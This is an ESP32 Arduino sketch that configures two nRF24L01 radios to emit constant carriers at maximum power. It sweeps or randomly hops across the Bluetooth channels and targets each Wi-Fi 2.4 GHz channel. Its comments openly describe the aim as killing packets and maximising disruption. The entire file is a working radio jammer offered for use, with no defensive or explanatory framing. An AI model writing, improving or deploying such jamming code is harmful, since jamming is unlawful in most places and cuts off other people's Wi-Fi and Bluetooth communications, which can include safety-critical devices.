#include "RF24.h"
#include "esp_bt.h"
#include "esp_wifi.h"
#include <SPI.h>
#include <ezButton.h>

SPIClass *sp = nullptr;
SPIClass *hp = nullptr;

RF24 radio(
    16, 15,
    16000000); // HSPI CAN SET SPI SPEED TO 16000000 BY DEFAULT ITS 10000000
RF24 radio1(
    22, 21,
    16000000); // VSPI CAN SET SPI SPEED TO 16000000 BY DEFAULT ITS 10000000

// HSPI=SCK = 14, MISO = 12, MOSI = 13, CS = 15 , CE = 16
// VSPI=SCK = 18, MISO =19, MOSI = 23 ,CS =21 ,CE = 22

unsigned int flag = 0;  // HSPI// Flag variable to keep track of direction
unsigned int flagv = 0; // VSPI// Flag variable to keep track of direction
int ch = 45;            // Variable to store value of ch
int ch1 = 45;           // Variable to store value of ch

// Wi-Fi 2.4GHz Channel Center Frequencies (Mapped to NRF24 offsets: 2400 +
// offset) Channels 1-14: 2412, 2417, 2422, 2427, 2432, 2437, 2442, 2447, 2452,
// 2457, 2462, 2467, 2472, 2484
const int wifi_channels[] = {12, 17, 22, 27, 32, 37, 42,
                             47, 52, 57, 62, 67, 72, 84};
const int num_wifi_channels = 14;
int wifi_idx = 0;
ezButton toggleSwitch(33);

void two() {
  // SWEEP BURST MODE
  // We rapidly scan through the required channels in a tight loop
  // but stay on each long enough to kill a packet.
  for (int burst = 0; burst < 40; burst++) {
    if (flagv == 0) {
      ch1 += 4;
    } else {
      ch1 -= 4;
    }

    if (flag == 0) {
      ch += 2;
    } else {
      ch -= 2;
    }

    if ((ch1 > 84) && (flagv == 0)) {
      flagv = 1;
    } else if ((ch1 < 2) && (flagv == 1)) {
      flagv = 0;
    }

    if ((ch > 79) && (flag == 0)) {
      flag = 1;
    } else if ((ch < 2) && (flag == 1)) {
      flag = 0;
    }

    radio.setChannel(ch); // Radio 0 sweeps Bluetooth spectrum

    // Radio 1 SNIPES Wi-Fi channels sequentially
    radio1.setChannel(wifi_channels[wifi_idx]);

    // Critical: Dwell time ensures the carrier overlaps a full packet window
    delayMicroseconds(800);

    wifi_idx++;
    if (wifi_idx >= num_wifi_channels)
      wifi_idx = 0;
  }
}

void one() {
  // RANDOM BURST MODE: BLUETOOTH + TARGETED WIFI
  // Performs a fast tight loop with sufficient dwell time.
  for (int burst = 0; burst < 50; burst++) {
    // Radio 1 STRICTLY targets Wi-Fi channels
    radio1.setChannel(wifi_channels[random(num_wifi_channels)]);
    // Radio 0 targets the Bluetooth space
    radio.setChannel(random(80));
    delayMicroseconds(800);
  }
}

void setup() {

  Serial.begin(115200);
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();
  toggleSwitch.setDebounceTime(50);

  initHP();
  initSP();
}

void initSP() {
  sp = new SPIClass(VSPI);
  sp->begin();
  if (radio1.begin(sp)) {
    Serial.println("SP Started !!!");
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true); // True enables LNA for max range
    radio1.setDataRate(RF24_2MBPS);
    radio1.setAddressWidth(3); // Tighter bandwidth occupation
    radio1.setPayloadSize(32); // Maximize packet airtime for disruption
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.printPrettyDetails();
    radio1.startConstCarrier(RF24_PA_MAX, ch1);
  } else {
    Serial.println("SP couldn't start !!!");
  }
}
void initHP() {
  hp = new SPIClass(HSPI);
  hp->begin();
  if (radio.begin(hp)) {
    Serial.println("HP Started !!!");
    radio.setAutoAck(false);
    radio.stopListening();
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true); // True enables LNA for max range
    radio.setDataRate(RF24_2MBPS);
    radio.setAddressWidth(3); // Tighter bandwidth occupation
    radio.setPayloadSize(32); // Maximize packet airtime for disruption
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.printPrettyDetails();
    radio.startConstCarrier(RF24_PA_MAX, ch);
  } else {
    Serial.println("HP couldn't start !!!");
  }
}

void loop() {

  // Increased aggressiveness: Check button state less often
  // and perform rapid burst hopping inside the functions instead.
  toggleSwitch.loop();
  int state = toggleSwitch.getState();

  if (state == HIGH) {
    two();
  } else {
    one();
  }
}